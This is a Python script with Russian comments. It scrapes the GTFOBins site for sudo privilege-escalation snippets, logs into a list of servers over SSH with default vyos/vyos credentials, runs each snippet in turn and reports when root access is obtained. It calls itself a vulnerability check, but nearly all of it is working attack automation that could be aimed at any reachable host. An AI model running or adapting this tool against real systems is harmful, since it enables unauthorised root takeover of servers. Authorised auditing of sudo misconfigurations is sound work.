import json

import requests
import netmiko
from bs4 import BeautifulSoup

all_functions = {}
load_file = {}

try:
    with open('all_commands.txt', 'r') as f:
        all_functions = json.load(f)
except:
    print('Ошибка при чтения файла all_commands.txt\nЕсли скрипт был запущен в первый раз или файл поврежден, '
          'то файл будет создан')


def create_json(URL, check_json='YES'):

    # Загружает страницу
    re = requests.get(URL)
    soup = BeautifulSoup(re.text, "html.parser")

    # Проверяет пустой ли файл с командами, если да, создает новый и сохраняет в корневой директории
    if all_functions != {} and check_json == 'YES':
        return all_functions

    # Сохраняет все доступные функции
    tags_ul = soup.find_all("ul", id="bin-search-filters")[0]
    function_list = [tag_li.a.get('href')[2:] for tag_li in tags_ul.find_all('li')]

    # Сохраняет все доступные команды
    tags_a = [tags_a.get("href").split('/')[2] for tags_a in soup.select('td li a')]
    binary_list = lambda: sorted(list(set(tags_a)))

    # Сохраняет ссылку на команду
    path_list = [URL + full_path.get('href') for full_path in soup.select('td li a')]

    # Создает файл типа json с командами, функциями и кодом
    for link_binary in path_list:
        _func = link_binary.split('/')[-1][1:]
        _binary = link_binary.split('/')[-2]
        if _func not in all_functions.keys():
            all_functions[_func] = {}
            all_functions[_func][_binary] = {}
            all_functions[_func][_binary]['url'] = [link_binary]
        else:
            all_functions[_func][_binary] = {}
            all_functions[_func][_binary]['url'] = [link_binary]

    for link in all_functions['sudo']:
        url = all_functions['sudo'][link]['url']
        soup = BeautifulSoup(requests.get(url[0]).text, 'html.parser')
        tegs_ul = soup.find('h2', id="sudo")
        for code in tegs_ul.find_next_siblings():
            for binary in code.find_all('pre'):
                binary = binary.get_text()
                if all_functions['sudo'][link].get('code') is None:
                    all_functions['sudo'][link]['code'] = []
                    all_functions['sudo'][link]['code'].append(binary)
                else:
                    all_functions['sudo'][link]['code'].append(binary)

    # Создает файл json с командами, функциями и кодом и записывает в корневую директорию скрипта
    with open('all_commands.txt', 'w') as f:
        json.dump(all_functions, f, ensure_ascii=False, indent=2)
    return all_functions


def check_server(file_ip, username, password, last_commands=None, last_ip=None):
    global console, auth, file_sudoers, commands

    out_file = {}

    # Загружает файл с IP-адресами через запятую
    try:
        with open(file_ip, 'r') as f:
            ip_address = f.read().strip().split(',')
    except FileNotFoundError:
        print('Не верно указано имя файла с ip адресами или его не существует')

    # Подключается к серверу и отправляет команды
    try:
        file_sudoers = open('sudoers.txt', 'a')
        for ip in ip_address:
            if (ip == last_ip) or (last_ip is None):

                auth = {
                    'device_type': 'vyos',
                    'host': ip,
                    'username': username,
                    'password': password,
                    'port': '22',
                    'allow_auto_change': True,
                    'session_log': f'log_{ip}.txt',
                    'session_log_file_mode': 'append',
                }

                out_file[ip] = []
                ssh = netmiko.ConnectHandler(**auth)

                for commands in all_functions['sudo']:
                    if (commands == last_commands) or (last_commands is None):
                        last_commands = None

                        # Команды из-за которых скрипт ведет себя не коректно
                        if not commands in ['zypper', 'cpan', 'crontab', 'dmesg', 'hping3', 'iftop', 'journalctl',
                                            'less', 'nano', 'nmap', 'openssl', 'pico', 'screen', 'snap', 'socat',
                                            'split', 'tcpdump', 'top', 'vigr', 'loginctl', 'systemctl', 'vipw', 'wget']:
                            print(
                                f"Старт команды: {commands}\n"
                                f"Пользователь: {ssh.send_command_timing('whoami')}")
                            for command in all_functions['sudo'][commands]['code']:
                                ssh.send_command_timing(f'echo {commands}')
                                console = ssh.send_command_timing(command, 1.0, 15)

                            if ssh.check_config_mode():
                                print("Получены права root !")
                                print(ssh.send_command_timing('id'))
                                ssh = netmiko.ConnectHandler(**auth)
                            out_file[ip].append(commands)
                            print(f"Конец команды: {commands}")
                            print('*' * 50)
                if commands == 'zypper':
                    print(f'Проверка на уязвимсоти адреса {ip} - завершена.')
                    print(f'Сформирован файл - sudoers.txt\nСформирован файл - log_{ip}.txt\n')

    except:
        out_file[ip] = set(out_file[ip])
    finally:
        json.dump(out_file, file_sudoers, ensure_ascii=False, indent=2)
        file_sudoers.close()
        return out_file


# Главная функция для запуска скрипта.

def main(ip_address, login, password, last_commands=None, last_ip=None):
    print('Загружается файл json...')
    create_json('https://gtfobins.github.io', check_json='YES')
    print('Загрузка выполнена...')
    print('Запуск функции по проверке серверов')
    check_server(ip_address, login, password, last_commands, last_ip)


if __name__ == '__main__':
    main(ip_address='ip_address.txt', login='vyos', password='vyos')